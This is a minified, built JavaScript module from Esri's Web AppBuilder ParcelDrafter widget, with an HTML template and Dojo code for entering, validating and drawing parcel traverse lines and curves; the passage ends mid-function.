// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ParcelDrafter/NewTraverse.html":'\x3cdiv\x3e\r\n    \x3c!-- Traverse grid container--\x3e\r\n    \x3cdiv class\x3d"esriCTNewTraverseContainer"\x3e\r\n        \x3c!-- Traverse grid title--\x3e\r\n        \x3cdiv class\x3d"esriCTNewTraverseLabelDiv"\x3e\r\n            \x3cdiv class\x3d"esriCTGridEmptyLabel"\x3e\r\n                \x26nbsp\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTGridLabels esriCTEllipsis esriCTGridBearingLabel" title\x3d"${nls.traverseSettings.bearingLabel}"\x3e\r\n                ${nls.traverseSettings.bearingLabel}\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTGridLabels esriCTEllipsis" title\x3d"${nls.traverseSettings.lengthLabel}"\x3e\r\n                ${nls.traverseSettings.lengthLabel}\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTGridLabels esriCTEllipsis" title\x3d"${nls.traverseSettings.radiusLabel}"\x3e\r\n                ${nls.traverseSettings.radiusLabel}\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Traverse grid items--\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"traverseGrid" class\x3d"esriCTTraverseGrid"\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Traverse grid initial entry row--\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"traverseEntryNode" class\x3d"esriCTEntrtyNodeContent esriCTRow"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"lineSymbolNode" class\x3d"esriCTSymbolContainer"\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"bearingNode" class\x3d"esriCTBearingRow" data-dojo-type\x3d"dijit/form/ValidationTextBox"\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"lengthNode" data-dojo-type\x3d"dijit/form/ValidationTextBox"\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"radiusNode" data-dojo-type\x3d"dijit/form/ValidationTextBox"\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTAddRow"\x3e\r\n                \x3cdiv data-dojo-attach-point\x3d"addButton" class\x3d"esriCTAddIcon"\r\n                title\x3d"${nls.traverseSettings.addButtonTitle}"\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Traverse grid tools container--\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseTool"\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseToolContainer"\x3e\r\n                \x3c!-- Screen digitization tool--\x3e\r\n                \x3cdiv class\x3d"esriCTTraverseToolIcons ecriCTLocationIcon esriCTCursorPointer" title\x3d"${nls.planSettings.onScreenDigitizationTooltipText}"\r\n                    data-dojo-attach-point\x3d"screenDigitizationNode"\x3e\r\n                \x3c/div\x3e\r\n                \x3c!-- Zoom tool--\x3e\r\n                \x3cdiv class\x3d"esriCTHidden esriCTTraverseToolIcons ecriCTZoomToIcon esriCTCursorPointer" title\x3d"${nls.planSettings.zoomToLocationTooltipText}"\r\n                    data-dojo-attach-point\x3d"zoomToNode"\x3e\r\n                \x3c/div\x3e\r\n                \x3c!-- Expand/Collapse grid tool--\x3e\r\n                \x3cdiv class\x3d"esriCTHidden  esriCTTraverseToolIcons esriCTCollapse esriCTCursorPointer" title\x3d"${nls.planSettings.collapseGridTooltipText}"\r\n                    data-dojo-attach-point\x3d"expandCollapseNode"\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Misclose details container--\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"misCloseDetailsNode"\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Parcel tools (rotation/scale) container--\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"parcelToolsNode"\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Parcel info (polygon layer fields) \x26 save/cancle button container--\x3e\r\n    \x3cdiv class\x3d"esriCTPlanInfoNode" data-dojo-attach-point\x3d"planInfoNode"\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/Evented dojo/text!./NewTraverse.html dojo/_base/lang dojo/_base/array dojo/dom-class dojo/dom-construct dojo/dom-style dojo/dnd/Source dojo/on dijit/form/ValidationTextBox ./SymbolSelector ./MiscloseDetails ./ParcelTools ./PlanInfo ./geometryUtils ./utils esri/graphic esri/symbols/jsonUtils esri/layers/GraphicsLayer esri/graphicsUtils dojo/dom-attr dojo/query esri/SpatialReference dojo/keys dijit/focus dijit/TooltipDialog dijit/popup dojo/Deferred esri/geometry/Extent dojo/dom-geometry".split(" "),
function(D,E,F,G,H,f,t,k,l,z,I,q,J,K,L,M,N,g,m,v,A,w,O,p,x,B,r,u,P,C,Q,R,y){return D([E,F,G],{baseClass:"jimu-widget-ParcelDrafter",templateString:H,parcelLinesGraphicsLayer:null,parcelPointsGraphicsLayer:null,parcelPolygonGraphicsLayer:null,lineLayerSpatialReference:null,polygonLayerSpatialReference:null,_itemList:[],_nodes:[],_dndContainer:null,startPoint:null,_startPointForNextLine:null,_planSettings:null,_arrayOfAllBoundaryLines:[],_rotationAngle:0,_scaleValue:1,polygonDeleteArr:[],polylineDeleteArr:[],
_popupDialog:null,_popupCoords:null,numberFieldTypes:["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"],lengthFieldPlaces:2,radiusFieldPlaces:2,miscloseDistanceFieldPlaces:2,postCreate:function(){this.numberFieldTypes=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];this.polygonDeleteArr=[];this.polylineDeleteArr=[];this._arrayOfAllBoundaryLines=[];this._nodes=[];this._itemList=[];k.add(this.domNode,"esriCTNewTraverseGrid");
this._addGraphicsLayer();this._createTraverseGrid();this._setValidatorForInitialRow();this._handleEventsOnInitialRow();this._symbolSelector=this._createLineSelector(this.lineSymbolNode,null);this.own(q(this.screenDigitizationNode,"click",f.hitch(this,this._onDigitizationButtonClicked)));this.own(q(this.zoomToNode,"click",f.hitch(this,this._onZoomButtonClicked)));this.own(q(this.expandCollapseNode,"click",f.hitch(this,this._onExpandCollapseClicked)));this.own(q(this.addButton,"click",f.hitch(this,
function(){this._addNewItem(!1)})));this._createMiscloseDetails();this._createParcelTools();this._createPlanInfo();this._createTooltip();this.config.polylineLayer&&this.config.polylineLayer.popupInfo&&this.config.polylineLayer.popupInfo.fieldInfos&&t.forEach(this.config.polylineLayer.popupInfo.fieldInfos,f.hitch(this,function(a){a.fieldName===this.config.polylineLayer.bearing.name&&a.format&&(m.bearingFieldPlaces=a.format.places);a.fieldName===this.config.polylineLayer.distance.name&&a.format&&(this.lengthFieldPlaces=
a.format.places);a.fieldName===this.config.polylineLayer.radius.name&&a.format&&(this.radiusFieldPlaces=a.format.places)}));this.config.polygonLayer&&this.config.polygonLayer.popupInfo&&this.config.polygonLayer.popupInfo.fieldInfos&&t.forEach(this.config.polygonLayer.popupInfo.fieldInfos,f.hitch(this,function(a){a.fieldName===this.config.polygonLayer.miscloseDistance.name&&a.format&&(this.miscloseDistanceFieldPlaces=a.format.places)}))},_addGraphicsLayer:function(){this.parcelPolygonGraphicsLayer=
new w;this.parcelLinesGraphicsLayer=new w;this.parcelPointsGraphicsLayer=new w;this.map.addLayer(this.parcelPolygonGraphicsLayer);this.map.addLayer(this.parcelLinesGraphicsLayer);this.map.addLayer(this.parcelPointsGraphicsLayer)},_setValidatorForInitialRow:function(){this.bearingNode.validator=f.hitch(this,function(a){return this._bearingValidator(a,["*","*tb"])});this.bearingNode.invalidMessage=this.nls.newTraverse.invalidBearingMessage;this.lengthNode.validator=f.hitch(this,function(a){if("*"===
a&&this._itemList&&0<this._itemList.length)return!0;if(""===this.radiusNode.get("value")&&0>parseFloat(a))return this.lengthNode.invalidMessage=this.nls.newTraverse.negativeLengthMessage,!1;this.lengthNode.invalidMessage=this.nls.newTraverse.invalidLengthMessage;return this._lengthValidator(a)});this.lengthNode.invalidMessage=this.nls.newTraverse.invalidLengthMessage;this.radiusNode.validator=f.hitch(this,function(a){var b;if("*"===a&&this._itemList&&0<this._itemList.length)return!0;b=this._radiusValidator(a);
if(""!==a)if((a=this.lengthNode.isValid())&&b){if(!this._validateLengthRadiusProportion(b,a))return null;b&&(a=this.lengthNode.value,this.lengthNode.reset(),this.lengthNode.set("value",a))}else b=null;return b});this.radiusNode.invalidMessage=this.nls.newTraverse.invalidRadiusMessage},_bearingValidator:function(a,b){return-1!==b.indexOf(a)&&this._itemList&&0<this._itemList.length?!0:this._validateBearing(a,b)},_lengthValidator:function(a,b){return""===a||"0"===a||0===a?!1:this._validateLength(a,b)},
_radiusValidator:function(a,b){return""===a?!0:this._validateLength(a,b)},_handleEventsOnInitialRow:function(){this.own(q(this.bearingNode,"keypress",f.hitch(this,this._bearingValueEntered)));this.own(q(this.lengthNode,"keypress",f.hitch(this,this._lengthValueEntered)));this.own(q(this.radiusNode,"keypress",f.hitch(this,this._radiusValueEntered)))},_copyPrevValue:function(a){switch(a){case "Bearing":a=this.bearingNode.get("value");"*"===a&&0<this._itemList.length&&(a=this._itemList[this._itemList.length-
1].BearingConversions?this._getBearingAccordingToPlanSettings(this._itemList[this._itemList.length-1].BearingConversions):this._itemList[this._itemList.length-1].Bearing,this.bearingNode.set("value",a));break;case "Length":a=this.lengthNode.get("value");"*"===a&&0<this._itemList.length&&(a="radiusAndArcLength"===this._planSettings.circularCurveParameters&&this._itemList[this._itemList.length-1].ArcLengthConversions?this._itemList[this._itemList.length-1].ArcLengthConversions[this._planSettings.distanceAndLengthUnits]:
this._itemList[this._itemList.length-1].LengthConversions?this._itemList[this._itemList.length-1].LengthConversions[this._planSettings.distanceAndLengthUnits]:this._itemList[this._itemList.length-1].Length,this.lengthNode.set("value",a));break;case "Radius":a=this.radiusNode.get("value"),"*"===a&&0<this._itemList.length&&(a=this._itemList[this._itemList.length-1].RadiusConversions?this._itemList[this._itemList.length-1].RadiusConversions[this._planSettings.distanceAndLengthUnits]:this._itemList[this._itemList.length-
1].Radius,this.radiusNode.set("value",a))}},_bearingValueEntered:function(a){a=a.charCode||a.keyCode;a===r.ENTER||a===r.TAB?(this.bearingNode.get("value"),this._copyPrevValue("Bearing"),a===r.ENTER&&this.bearingNode.isValid()?u.focus(this.lengthNode):this.bearingNode.validate(!1)):setTimeout(f.hitch(this,function(){this.bearingNode.validate(!1)}),100)},_lengthValueEntered:function(a){a=a.charCode||a.keyCode;a===r.ENTER||a===r.TAB?(this.lengthNode.get("value"),this._copyPrevValue("Length"),a===r.ENTER&&
this.lengthNode.isValid()?u.focus(this.radiusNode):this.lengthNode.validate(!1)):setTimeout(f.hitch(this,function(){this.lengthNode.validate(!1)}),100)},_radiusValueEntered:function(a){a=a.charCode||a.keyCode;a===r.ENTER||a===r.TAB?(a=this.radiusNode.get("value"),this._copyPrevValue("Radius"),""===a||this.radiusNode.isValid()?this.bearingNode.isValid()?this.lengthNode.isValid()?(this._addNewItem(),u.focus(this.bearingNode)):(this.lengthNode.validate(!1),u.focus(this.lengthNode)):(this.bearingNode.validate(!1),
u.focus(this.bearingNode)):this.radiusNode.validate(!1)):setTimeout(f.hitch(this,function(){this.radiusNode.validate(!1)}),100)},_validateBearing:function(a){return(a=m.categorizeBearingFormat(a,this._planSettings))?a:null},_validateLength:function(a,b){switch(b){case "feets":a=m.categorizeLengthFormatForFeet(a);break;case "meters":a=m.categorizeLengthFormat(a,"meters");break;case "uSSurveyFeet":a=m.categorizeLengthFormat(a,"uSSurveyFeet");break;default:a=m.categorizeLengthFormat(a,this._planSettings.distanceAndLengthUnits)}return a?
a:null},_validateLengthRadiusProportion:function(a,b){return a&&b&&(a=a[this._planSettings.distanceAndLengthUnits],b=b[this._planSettings.distanceAndLengthUnits],0!==a&&(a=2*parseFloat(Math.abs(a)),"radiusAndArcLength"===this._planSettings.circularCurveParameters&&(a*=Math.PI),a<parseFloat(Math.abs(b))))?null:!0},_getValidatedValues:function(a,b,d){var c={},e;a?(c=a,b&&("Bearing"!==b&&c.BearingConversions&&(c.Bearing=this._getBearingAccordingToPlanSettings(c.BearingConversions)),"Length"!==b&&c.LengthConversions&&
(c.Length=c.LengthConversions[this._planSettings.distanceAndLengthUnits]),"Radius"!==b&&c.RadiusConversions&&(c.Radius=c.RadiusConversions[this._planSettings.distanceAndLengthUnits]),"Bearing"===b&&"*tb"===c.Bearing.toString().toLowerCase()&&0<this._itemList.length&&0!==d&&(c.isTB=!0))):(this._copyPrevValue("Bearing"),this._copyPrevValue("Length"),this._copyPrevValue("Radius"),c.LineSymbol=this._symbolSelector.selectedSymbol,c.Bearing=this.bearingNode.get("value"),c.Length=this.lengthNode.get("value"),
c.Radius=this.radiusNode.get("value"),"*tb"===c.Bearing.toString().toLowerCase()&&0<this._itemList.length?c.isTB=!0:c.isTB=!1);if(""!==f.trim(c.Bearing.toString())&&""!==f.trim(c.Length.toString())&&((b=this._validateBearing(c.Bearing))||c.isTB)){c.BearingConversions=b;if(""===f.trim(c.Length.toString())&&""===f.trim(c.Radius.toString()))return null;if(""!==f.trim(c.Length.toString()))if((b=this._validateLength(c.Length))&&0!==b.meters){if(""!==f.trim(c.Radius.toString()))if(e=this._validateLength(c.Radius)){if(!this._validateLengthRadiusProportion(e,
b))return null;c.RadiusConversions=e}else return null;else{if(0>parseInt(b.meters,10))return null;c.RadiusConversions=null}c.LengthConversions=b}else return null;c.RadiusConversions&&(c=this._createValuesForArc(c));c.isTB&&(a=a&&!isNaN(d)?this._itemList[d-1]:this._itemList[this._itemList.length-1],c=this._setTangentBearing(c,a))}else return null;return c},_setTangentBearing:function(a,b){var d,c;c=f.clone(this._planSettings);c.directionOrAngleType="northAzimuth";c.directionOrAngleUnits="decimalDegree";
d=b.BearingConversions.naDD;b.RadiusConversions&&0!==b.RadiusConversions.meters&&(d=g.chordBearingToTangentBearing(d,b.RadiusConversions.meters,b.ChordLengthConversions.meters));a.RadiusConversions&&0!==a.RadiusConversions.meters?(d=g.tangentBearingToChordBearing(d,a.RadiusConversions.meters,a.ChordLengthConversions.meters),a.Bearing=d,a.BearingConversions=m.categorizeBearingFormat(a.Bearing,c)):b.RadiusConversions&&0!==b.RadiusConversions.meters?(a.Bearing=d,a.BearingConversions=m.categorizeBearingFormat(a.Bearing,
c)):(a.Bearing=b.Bearing,a.BearingConversions=f.clone(b.BearingConversions));return a},_updateTBFromIndex:function(a){var b;for(b=!1;a<this._itemList.length;a++)if(this._itemList[a]&&this._itemList[a].isTB)this._itemList[a]=this._setTangentBearing(this._itemList[a],this._itemList[a-1]),b=!0;else break;return b},_onZoomButtonClicked:function(){this._setExtentToLayer(this.parcelLinesGraphicsLayer,!0)},_onExpandCollapseClicked:function(){k.toggle(this.traverseGrid,"esriCTHidden");k.contains(this.expandCollapseNode,
"esriCTExpand")?(p.set(this.expandCollapseNode,"title",this.nls.planSettings.collapseGridTooltipText),k.replace(this.expandCollapseNode,"esriCTCollapse","esriCTExpand")):(p.set(this.expandCollapseNode,"title",this.nls.planSettings.expandGridTooltipText),k.replace(this.expandCollapseNode,"esriCTExpand","esriCTCollapse"))},setRotation:function(a){a=g.getRotationAngleBetweenPoints(this.startPoint,a);0<this._itemList.length&&(a-=this._itemList[0].BearingConversions.naDDRound);360===a&&(a=0);this._parcelToolInstance.setRotation(a)},
setScaling:function(a){a=g.getScaleDistanceBetweenPoints(this.startPoint,a);this.distance?(a/=this.distance,.1>a&&(a=.1),this._parcelToolInstance.setScale(a)):this.distance=a},_addNewItem:function(a){var b,d;(b=this._getValidatedValues())?(a&&this._rotationAngle&&(d=b.BearingConversions.naDD-this._rotationAngle,d=this.getAngleFromDDTOQB(360<=d?d%360:d),b.Bearing=d,b.BearingConversions=this._validateBearing(d)),d=f.trim(b.Radius.toString()),this._itemList.push(b),this._createRow(b,this._itemList.length-
1),this._resetEntryRow(a),this.appliedCompassRule?this.setParcelClosure():(""===d||"0"===d||0===d?this._drawStraightLine(b,!0):this._drawArc(b,!0),this._showHideTraverseTools())):this.bearingNode.isValid()?""!==this.lengthNode.get("value")&&this.lengthNode.isValid()?""===this.radiusNode.get("value")||this.radiusNode.isValid()||(u.focus(this.radiusNode),this.radiusNode.validate(!1)):(u.focus(this.lengthNode),this.lengthNode.validate(!1)):(u.focus(this.bearingNode),this.bearingNode.validate(!1))},_createValuesForArc:function(a){var b;
a.RadiusConversions?(b=a.RadiusConversions.meters,"radiusAndArcLength"===this._planSettings.circularCurveParameters?(a.ArcLength=a.LengthConversions.meters,a.ArcLengthConversions=f.clone(a.LengthConversions),a.ChordLength=g.getChordLengthFromArcLength(a.ArcLength,b),a.ChordLengthConversions=this._validateLength(a.ChordLength,"meters")):(a.ChordLength=a.LengthConversions.meters,a.ChordLengthConversions=f.clone(a.LengthConversions),a.ArcLength=g.getArcLengthFromChordLength(a.ChordLength,b),a.ArcLengthConversions=
this._validateLength(a.ArcLength,"meters"))):("radiusAndArcLength"===this._planSettings.circularCurveParameters&&a.ArcLengthConversions&&(a.Length=a.ArcLength,a.LengthConversions=f.clone(a.ArcLengthConversions)),a.ChordLength=0,a.ChordLengthConversions=null,a.ArcLength=0,a.ArcLengthConversions=null);return a},_onDigitizationButtonClicked:function(){k.toggle(this.screenDigitizationNode,"esriCTEnableButton");k.contains(this.screenDigitizationNode,"esriCTEnableButton")?this.emit("activateDigitizationTool"):
this.emit("deActivateDigitizationTool")},_createMiscloseDetails:function(){this._misCloseDetailsInstance=new L({nls:this.nls,config:this.config,appConfig:this.appConfig,numberFieldTypes:this.numberFieldTypes,validateNumericField:this.validateNumericField},l.create("div",{},this.misCloseDetailsNode));this._misCloseDetailsInstance.setMiscloseDetails(null)},_createParcelTools:function(){this._parcelToolInstance=new M({nls:this.nls,config:this.config},l.create("div",{},this.parcelToolsNode));this.own(this._parcelToolInstance.on("rotateGeometries",
f.hitch(this,function(a){a!==this._rotationAngle&&(this._rotationAngle=a,this._itemList&&0<this._itemList.length&&this.setStartPoint(this.startPoint))})));this.own(this._parcelToolInstance.on("scaleGeometries",f.hitch(this,function(a){a!==this._scaleValue&&(this._scaleValue=a,this._itemList&&0<this._itemList.length&&this.setStartPoint(this.startPoint))})));this.own(this._parcelToolInstance.on("toggleRotating",f.hitch(this,function(a){this.emit("toggleRotating",a)})));this.own(this._parcelToolInstance.on("toggleScaling",
f.hitch(this,function(a){this.emit("toggleScaling",a)})))},_createPlanInfo:function(){this._planInfoInstance=new N({map:this.map,nls:this.nls,config:this.config,loading:this.loading,numberFieldTypes:this.numberFieldTypes,validateNumericField:this.validateNumericField,geometryService:this.geometryService,parcelPolygonGraphicsLayer:this.parcelPolygonGraphicsLayer,parcelLinesGraphicsLayer:this.parcelLinesGraphicsLayer,polylineLayerUnit:g.getUnitValueForSR(this.lineLayerSpatialReference),polygonLayerUnit:g.getUnitValueForSR(this.polygonLayerSpatialReference)},
l.create("div",{},this.planInfoNode));this.own(this._planInfoInstance.on("cancelTraversedParcel",f.hitch(this,function(){this.emit("cancelTraverse")})));this.own(this._planInfoInstance.on("showMessage",f.hitch(this,function(a){this._showMessage(a)})));this.own(this._planInfoInstance.on("saveTraversedParcel",f.hitch(this,function(){var a;this.closePopup();if(this._itemList&&0<this._itemList.length){var b;b=this._misCloseDetailsInstance.traverseStatedArea.get("value").trim();a=this._planInfoInstance.validateParcelDetails(b);
a.status?(""===this._misCloseDetailsInstance.traverseStatedArea.get("value")&&(b=null),a={},a.itemList=this._itemList,a.statedArea=b,a.rotation=this._rotationAngle,a.scale=this._scaleValue,a.appliedCompassRule=this.appliedCompassRule,a.miscloseDetails=this._misCloseDetailsInstance.getMiscloseDetails(),a.polygonDeleteArr=this.polygonDeleteArr,a.polylineDeleteArr=this.polylineDeleteArr,a.planSettings=this._planSettings,this._planInfoInstance.saveData(a)):this._showMessage(a.message)}else this._showMessage(this.nls.newTraverse.enterValidParcelInfoMessage)})));
this.own(this._planInfoInstance.on("displayMainPageAfterSave",f.hitch(this,function(){this.emit("displayMainPageAfterSave")})))},_createTraverseGrid:function(){var a;this._nodes=[];l.empty(this.traverseGrid);this._dndContainer=new I(this.traverseGrid,{skipForm:!0,singular:!0});this._dndContainer.copyState=function(){return!1};for(a=0;a<this._itemList.length;a++)this._createRow(this._itemList[a],a);this.own(this._dndContainer.on("DndDrop",f.hitch(this,this._onDndDrop)));this._dndContainer.insertNodes(!1,
this._nodes)},_createFieldInputs:function(a,b,d,c){var e=new J({value:b,"class":d?d:""});e.placeAt(a);"esriCTBearingRow"===d?(e.validator=f.hitch(this,function(a){"*tb"!==a&&"*"===a.charAt(0)&&(a=a.slice(1));return this._bearingValidator(a,["*tb"])}),e.invalidMessage=this.nls.newTraverse.invalidBearingMessage):"esriCTLengthRow"===d?(e.validator=f.hitch(this,this._lengthValidator),e.invalidMessage=this.nls.newTraverse.invalidLengthMessage):"esriCTRadiusRow"===d&&(e.validator=f.hitch(this,this._radiusValidator),
e.invalidMessage=this.nls.newTraverse.invalidRadiusMessage);this.own(q(e,"blur",f.hitch(this,function(){var b=parseInt(p.get(a,"rowIndex"),10);this._updateParcelValues(e,b,c)})));this.own(q(e,"keypress",f.hitch(this,function(b){(b.charCode||b.keyCode)===r.ENTER&&(b=parseInt(p.get(a,"rowIndex"),10),this._updateParcelValues(e,b,c));setTimeout(f.hitch(this,function(){e.validate(!1)}),100)})))},_createRow:function(a,b){var d,c;d=l.create("div",{"class":"dojoDndItem esriCTRow",rowIndex:b});c=l.create("div",
{rowIndex:b},d);this._createLineSelector(c,a.LineSymbol,b);c=this._getBearingAccordingToPlanSettings(a.BearingConversions);a.isTB&&(c="*"+c);this._createFieldInputs(d,c,"esriCTBearingRow");a.RadiusConversions?(c=this._getRoundedValue(a.RadiusConversions,"Radius"),a="radiusAndArcLength"===this._planSettings.circularCurveParameters?this._getRoundedValue(a.ArcLengthConversions,"Length"):this._getRoundedValue(a.ChordLengthConversions,"Length")):(c="",a=this._getRoundedValue(a.LengthConversions,"Length"));
this._createFieldInputs(d,a,"esriCTLengthRow");this._createFieldInputs(d,c,"esriCTRadiusRow");this._createDeleteButton(d,b);this._nodes.push(d);this._dndContainer.clearItems();this._dndContainer.insertNodes(!1,this._nodes)},_createLineSelector:function(a,b,d){var c;c=new K({hideOnSelect:!0,symbolData:this.config.lineTypes},a);k.add(c.domNode,"esriCTSymbolContainer");b?(c.selectSymbol(b),p.set(c.domNode,"rowIndex",d),c.onSelect=f.hitch(this,function(a){var b;b=parseInt(p.get(c.domNode,"rowIndex"),
10);this._itemList[b].LineSymbol=a;this.setStartPoint(this.startPoint)})):c.setDefault();return c},_createDeleteButton:function(a,b){var d;d=l.create("div",{"class":"esriCTDeleteRow"},a);b=l.create("div",{"class":"esriCTDeleteIcon",rowIndex:b,title:this.nls.traverseSettings.deleteButtonTitle},d);this.own(q(b,"click",f.hitch(this,function(b){b=parseInt(p.get(b.currentTarget,"rowIndex"),10);this._deleteRow(a,b)})))},_deleteRow:function(a,b){var d;if(this._itemList.length){this._dndContainer.delItem(a.id);
l.destroy(a);this._nodes.splice(b,1);this._itemList.splice(b,1);this._dndContainer.sync();this._updateRowIndexes();if(this._itemList[b]&&this._itemList[b].isTB){if(1===this._itemList.length||0===b)this._itemList[0].isTB=!1,b++;1<this._itemList.length&&(d=this._updateTBFromIndex(b))}this.appliedCompassRule?this.setParcelClosure(!0):this.setStartPoint(this.startPoint);d&&this._reGenerateTraverseGrid();this._showHideTraverseTools()}},_updateRowIndexes:function(){var a;a=x(".esriCTRow",this.traverseGrid);
t.forEach(a,f.hitch(this,function(a,d){var b;p.set(a,"rowIndex",d);(b=x(".esriCTDeleteIcon",a)[0])&&p.set(b,"rowIndex",d);(a=x(".esriCTSymbolContainer",a)[0])&&p.set(a,"rowIndex",d)}))},_onDndDrop:function(){var a,b=[],d;this._dndContainer.sync();a=this._dndContainer.getAllNodes();a.forEach(f.hitch(this,function(a){a=parseInt(p.get(a,"rowIndex"),10);b.push(this._itemList[a])}));this._nodes=a;this._itemList=[];this._itemList=b;this._updateRowIndexes();for(a=0;a<this._itemList.length;a++)0===a&&this._itemList[a].isTB&&
(this._itemList[a].isTB=!1,d=!0),this._itemList[a]&&this._itemList[a].isTB&&(this._itemList[a]=this._setTangentBearing(this._itemList[a],this._itemList[a-1]),d=!0);this.setStartPoint(this.startPoint);d&&this._reGenerateTraverseGrid()},_updateParcelValues:function(a,b,d){var c,e,h,n=!1,g;if(c=this._itemList[b])if(h=(h=a.get("value"))?f.trim(h.toString()):"",k.contains(a.domNode,"esriCTBearingRow")&&String(this._getBearingAccordingToPlanSettings(c.BearingConversions))!==h?(e="Bearing",c.Bearing=h,n=
!0,-1===h.indexOf("*")&&(c.isTB=!1)):k.contains(a.domNode,"esriCTLengthRow")&&String(this._getRoundedValue(c.LengthConversions,"Length"))!==h?(e="Length",c.Length=h,n=!0):k.contains(a.domNode,"esriCTRadiusRow")&&String(c.Radius)!==h&&(c.RadiusConversions?String(this._getRoundedValue(c.RadiusConversions,"Radius"))!==h&&(e="Radius",c.Radius=h,n=!0):(e="Radius",c.Radius=h,n=!0)),n)if(h=this._getValidatedValues(c,e,b)){if("Bearing"===e?(e=this._getBearingAccordingToPlanSettings(h.BearingConversions),
c.Bearing=this._getBearingAccordingToPlanSettings(h.BearingConversions,!0),c.isTB&&(e="*"+e),a.set("value",e),g=this._updateTBFromIndex(b+1)):"Length"===e?(e=this._getRoundedValue(c.LengthConversions,"Length"),c.Length=c.LengthConversions[this._planSettings.distanceAndLengthUnits],c.RadiusConversions&&(c=this._createValuesForArc(c)),a.set("value",e),g=this._updateTBFromIndex(b)):"Radius"===e&&(c.RadiusConversions?(c.Radius=c.RadiusConversions[this._planSettings.distanceAndLengthUnits],e=this._getRoundedValue(c.RadiusConversions,
"Radius")):e=c.Radius="",c=this._createValuesForArc(c),a.set("value",e),g=this._updateTBFromIndex(b)),this.appliedCompassRule?this.setParcelClosure(!0):this.setStartPoint(this.startPoint),g||d)this._reGenerateTraverseGrid(),d&&this._popupCoords&&this._openPopup(this._popupCoords)}else this._updateValues(c,e,a)},_updateValues:function(a,b,d){var c;"Bearing"===b?(a.Bearing=this._getBearingAccordingToPlanSettings(a.BearingConversions,!0),c=this._getBearingAccordingToPlanSettings(a.BearingConversions)):
"Length"===b?(a.Length=a.LengthConversions[this._planSettings.distanceAndLengthUnits],c=this._getRoundedValue(a.LengthConversions,"Length")):"Radius"===b&&(a.RadiusConversions?(a.Radius=a.RadiusConversions[this._planSettings.distanceAndLengthUnits],c=this._getRoundedValue(a.RadiusConversions,"Radius")):c=a.Radius="");d.set("value",c)},_showHideTraverseTools:function(){this._itemList&&0<this._itemList.length?(k.remove(this.expandCollapseNode,"esriCTHidden"),k.remove(this.zoomToNode,"esriCTHidden")):
(k.add(this.expandCollapseNode,"esriCTHidden"),k.add(this.zoomToNode,"esriCTHidden"))},_getBearingAccordingToPlanSettings:function(a,b){if("northAzimuth"===this._planSettings.directionOrAngleType&&"decimalDegree"===this._planSettings.directionOrAngleUnits)return b?a.naDD:a.naDDRound;if("northAzimuth"===this._planSettings.directionOrAngleType&&"degreeMinuteSeconds"===this._planSettings.directionOrAngleUnits)return a.naDMS;if("southAzimuth"===this._planSettings.directionOrAngleType&&"decimalDegree"===
this._planSettings.directionOrAngleUnits)return b?a.saDD:a.saDDRound;if("southAzimuth"===this._planSettings.directionOrAngleType&&"degreeMinuteSeconds"===this._planSettings.directionOrAngleUnits)return a.saDMS;if("quadrantBearing"===this._planSettings.directionOrAngleType&&"decimalDegree"===this._planSettings.directionOrAngleUnits)return b?a.qb3DD:a.qb3DDRound;if("quadrantBearing"===this._planSettings.directionOrAngleType&&"degreeMinuteSeconds"===this._planSettings.directionOrAngleUnits)return a.qb3DMS},
_getRoundedValue:function(a,b){var d;a=a[this._planSettings.distanceAndLengthUnits];switch(b){case "Length":d=this.lengthFieldPlaces;break;case "Radius":d=this.radiusFieldPlaces;break;case "MiscloseDistance":d=this.miscloseDistanceFieldPlaces}return m.honourPopupRounding(d,a)},_resetEntryRow:function(a){this.bearingNode.set("value","");this.lengthNode.set("value","");this.radiusNode.set("value","");this.bearingNode.reset();this.lengthNode.reset();this.radiusNode.reset();0<this._itemList.length&&(a=
this._itemList[this._itemList.length-1].isTB?"*tb":a?this._getBearingAccordingToPlanSettings(this._itemList[this._itemList.length-1].BearingConversions):this._itemList[this._itemList.length-1].Bearing,this.bearingNode.set("value",a),this.bearingNode.textbox.setSelectionRange(0,a.length))},_reGenerateTraverseGrid:function(){this._dndContainer&&(this._dndContainer.destroy(),this._dndContainer=null);l.empty(this.traverseGrid);this._createTraverseGrid()},_reDrawParcel:function(){this.parcelLinesGraphicsLayer.clear();
